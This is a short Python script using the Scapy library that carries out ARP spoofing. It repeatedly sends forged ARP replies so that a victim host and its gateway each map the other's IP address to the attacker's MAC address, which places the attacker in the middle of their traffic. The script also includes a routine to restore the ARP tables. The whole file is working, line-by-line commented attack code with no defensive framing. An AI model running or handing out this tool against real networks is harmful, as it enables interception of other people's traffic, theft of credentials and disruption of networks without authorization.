from scapy.all import ARP, Ether, sendp  # Importing necessary Scapy components
import time  # Used to pause between sending packets

def build_arp_packet(src_ip, src_mac, dst_ip, dst_mac):  # Builds a spoofed ARP packet
    ether = Ether(dst=dst_mac, src=src_mac)  # Ethernet layer with source and destination MAC
    arp = ARP(op=2, psrc=src_ip, pdst=dst_ip, hwsrc=src_mac, hwdst=dst_mac)  # ARP reply with spoofed info
    return ether / arp  # Combine Ethernet and ARP layers

def start_arp_spoofing(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, interval=2):
    print("[*] Starting ARP spoofing...")  # Starting message

    try:
        while True:  # Loop until user stops manually
            pkt_to_victim = build_arp_packet(gateway_ip, attacker_mac, victim_ip, victim_mac)  # Pretend to be gateway
            pkt_to_gateway = build_arp_packet(victim_ip, attacker_mac, gateway_ip, gateway_mac)  # Pretend to be victim

            sendp(pkt_to_victim, iface=iface, verbose=False)  # Send spoofed packet to victim
            sendp(pkt_to_gateway, iface=iface, verbose=False)  # Send spoofed packet to gateway

            print("[+] Sent ARP spoof packets to", victim_ip, "and", gateway_ip)  # Confirmation message
            time.sleep(interval)  # Wait before sending next round

    except KeyboardInterrupt:  # Stop with Ctrl+C
        print("\n[!] Spoofing interrupted by user.")  # Notification of interruption
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)  # Restore ARP tables
        print("[+] ARP tables restored.")  # Final confirmation

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface):  # Sends real ARP info to fix tables
    print("[*] Restoring ARP tables...")  # Info message

    pkt1 = build_arp_packet(gateway_ip, gateway_mac, victim_ip, victim_mac)  # Real gateway → victim
    pkt2 = build_arp_packet(victim_ip, victim_mac, gateway_ip, gateway_mac)  # Real victim → gateway

    for _ in range(5):  # Send multiple times to ensure delivery
        sendp(pkt1, iface=iface, verbose=False)
        sendp(pkt2, iface=iface, verbose=False)
        time.sleep(1)

    print("[+] ARP tables restored successfully.")  # Success message
